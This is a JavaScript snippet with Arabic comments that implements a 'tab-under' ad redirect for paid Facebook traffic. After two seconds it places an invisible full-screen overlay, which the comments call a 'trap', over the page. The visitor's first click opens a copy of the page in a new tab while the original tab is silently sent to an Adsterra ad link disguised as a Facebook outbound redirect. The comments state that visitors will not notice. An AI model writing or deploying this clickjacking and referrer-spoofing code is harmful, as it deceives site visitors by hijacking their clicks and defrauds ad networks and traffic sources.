(function() {
    // 1. التحقق من البراميتر (للعمل مع الترافيك المدفوع فقط)
    const secretKey = "fb_source"; 
    const urlParams = new URLSearchParams(window.location.search);
    if (!urlParams.has(secretKey)) return;

    // 2. روابط الإعلان والتمويه
    const baseAdUrl = 'https://adsterra-link.com/your-id'; // ضع رابطك هنا
    const finalAdUrl = baseAdUrl + window.location.search;
    const socialRef = "https://l.facebook.com/l.php?u=" + encodeURIComponent(finalAdUrl);

    function executeTabUnder() {
        if (sessionStorage.getItem('_tab_fired')) return;

        // أ. فتح نسخة من الصفحة الحالية في تبويب جديد (لكي يكمل الزائر تصفحه)
        const newTab = window.open(window.location.href, '_blank');
        
        if (newTab) {
            sessionStorage.setItem('_tab_fired', 'true');
            
            // ب. تحويل التبويب "الحالي" فوراً إلى الإعلان (عبر تمويه فيسبوك)
            // الزائر لن يشعر لأن عينه ستنتقل للتبويب الجديد الذي فُتح
            window.location.replace(socialRef);
        }
    }

    // إنشاء "الفخ" (الطبقة الشفافة) بعد ثانيتين
    setTimeout(() => {
        const overlay = document.createElement('div');
        overlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;z-index:2147483647;background:transparent;cursor:pointer;";
        document.body.appendChild(overlay);

        const start = () => {
            executeTabUnder();
            overlay.remove();
        };

        overlay.addEventListener('click', start);
        overlay.addEventListener('touchstart', start);
    }, 2000);
})();
